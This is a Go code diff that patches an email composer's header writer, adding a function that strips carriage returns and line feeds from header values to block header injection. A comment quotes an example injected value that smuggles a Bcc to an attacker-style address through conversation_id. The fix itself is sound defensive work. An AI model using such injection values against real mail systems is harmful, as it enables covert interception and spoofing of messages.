@@ -223,9 +223,25 @@ func headerWriter(buf *strings.Builder) func(string, string) {
 	return func(key, value string) {
 		buf.WriteString(textproto.CanonicalMIMEHeaderKey(key))
 		buf.WriteString(": ")
-		buf.WriteString(value)
+		buf.WriteString(sanitizeHeaderValue(value))
 		buf.WriteString("\r\n")
 	}
+}
+
+// sanitizeHeaderValue strips CR and LF to prevent header injection.
+// Without this, an attacker-controlled value like "abc\r\nBcc: leak@evil.com"
+// in conversation_id (or any other passthrough header) would smuggle
+// arbitrary headers into the composed message — a blind-Bcc /
+// fake-DKIM-Signature primitive available to any authenticated user.
+// Stripping is preferred over rejecting so the request still succeeds
+// with the malicious bytes neutralised; the API layer additionally
+// validates conversation_id and returns 400 on CRLF, but this is the
+// last line of defense for any future caller.
+func sanitizeHeaderValue(s string) string {
+	if !strings.ContainsAny(s, "\r\n") {
+		return s
+	}
+	return strings.NewReplacer("\r", "", "\n", "").Replace(s)
 }
 
 func generateBoundary() string {
